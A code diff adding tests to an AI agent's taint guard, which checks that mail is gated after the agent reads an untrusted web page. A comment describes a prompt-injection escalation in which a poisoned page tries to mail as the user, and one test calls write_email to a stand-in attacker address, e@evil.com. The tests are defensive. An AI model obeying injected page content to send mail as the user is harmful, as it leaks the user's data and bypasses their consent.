@@ -384,6 +384,24 @@ def run_offline(suite: Suite) -> None:
     _gate.evaluate("delete_path", {"path": "x"}, _led)
     suite.add("taint guard still asks", bool(_asked), "no prompt after injection")
 
+    # Reading a page and sending mail are the two halves of the browser
+    # escalation: a poisoned page must not be able to mail as the user.
+    _asked.clear()
+    _gate.evaluate("write_email", {"to": "e@evil.com", "subject": "s",
+                                   "body": "b"}, _led)
+    suite.add("tainted send_email is guarded", bool(_asked),
+              "sending mail was not gated after an injection")
+
+    _asked.clear()
+    _gate.evaluate("write_email", {"to": "a@b.com", "subject": "s", "body": "b"})
+    suite.add("clean send_email is not nagged", not _asked,
+              "prompted with no injection present")
+
+    suite.add("read_page taints the conversation",
+              "read_page" in config.UNTRUSTED_SOURCE_TOOLS, "not marked untrusted")
+    suite.add("write_email is destructive tier",
+              "write_email" in config.DESTRUCTIVE_TOOLS, "not in DESTRUCTIVE_TOOLS")
+
     # and it can be switched off entirely
     _orig = config.TAINT_GUARD
     try:
